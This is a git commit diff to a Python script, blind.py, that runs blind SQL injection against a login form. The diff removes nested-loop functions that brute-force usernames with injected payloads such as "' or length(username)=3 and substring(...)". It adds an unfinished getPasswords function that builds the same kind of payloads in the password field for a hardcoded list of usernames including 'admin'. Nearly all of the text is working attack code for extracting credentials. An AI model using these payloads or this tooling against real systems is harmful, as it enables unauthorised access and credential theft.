683b2d9b8b1150f7b947c785b03d2c9afc604c2f
root <root@localhost.localdomain>
2018-11-30 15:03:18 -0500

    Working on passwords now

--- blind.py
+++ blind.py
@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 import requests
-
+import itertools as iter
 from string import ascii_letters
 
 from string import digits
@@ -32,79 +32,7 @@ def get_answer(params):
 
         return False
 
-def oneLetter(users):
-    i = 97
-
-    while i <= 122:
-        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
-        if get_answer(params):
-            users.append(str(chr(i)))
-        i += 1
-        return users
-
-def threeLetters(users):
-    a = 97
-    while a <= 122:
-        b = 97
-        while b <= 122:
-            c = 97
-            while c <= 122:
-                params = {'userName': "' or length(username)=3 and substring(userName, 1, 3)=" + '\"' + str(chr(a))  + str(chr(b)) + str(chr(c)) + '\"' + " -- '", 'password': ''}
-                if get_answer(params):
-                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)))
-                c += 1
-            b += 1
-        a += 1    
-       
-    return users
-
-def getUsers(users):
-    a = 97
-    while a <= 122:
-        b = 97
-        while b <= 122:
-            c = 97
-            while c <= 122:
-                d = 97
-                while d <= 122:
-                    e = 97
-                    while e <= 122:
-                        f = 97
-                        while f <= 122:
-                            g = 97
-                            while g <= 122:
-                                params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(a)) + '\"' + " -- '", 'password': ''}
-                                if get_answer(params):
-                                    users.append(str(chr(a)))
-                                    print(params)
-                                params = {'userName': "' or length(username)=3 and substring(userName, 1, 3)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + '\"' + " -- '", 'password': ''}
-                                if get_answer(params):
-                                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)))
-                                    print(params)
-                                params = {'userName': "' or length(username)=4 and substring(userName, 1, 4)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + '\"' + " -- '", 'password': ''}
-                                if get_answer(params):
-                                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)))
-                                    print(params)
-                                params = {'userName': "' or length(username)=5 and substring(userName, 1, 5)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + '\"' + " -- '", 'password': ''}
-                                if get_answer(params):
-                                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)))
-                                    print(params)
-                                params = {'userName': "' or length(username)=7 and substring(userName, 1, 7)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + str(chr(f)) + str(chr(g)) + '\"' + " -- '", 'password': ''}
-                                if get_answer(params):
-                                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + str(chr(f)) + str(chr(g)))
-                                    print(params)
-                                g += 1
-                            f += 1
-                        e += 1
-                    d += 1
-                c += 1
-            b += 1
-        a += 1
-    return users
-
-
-
-def getUSersOptomized():
+def getUsersOptomized():
     partial = []
     done = []
 
@@ -197,9 +125,16 @@ def getUSersOptomized():
 
 
     return done
+
+def getPasswords(users):
+    partial = []
+    done = []
+    for user in users:
+        for i in iter.chain(range(48,58), range(97, 123)):
+            params = {'username': user, 'password': "' or length(password)=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
+    return partial, done
 def main():
-    users = []
-
-    print(getUSersOptomized())
-
+    users = ['a', 'bob', 'adm', 'fred', 'bill', 'admin', 'richard']#getUsersOptomized()
+    
+    print(getPasswords(users))
 main()
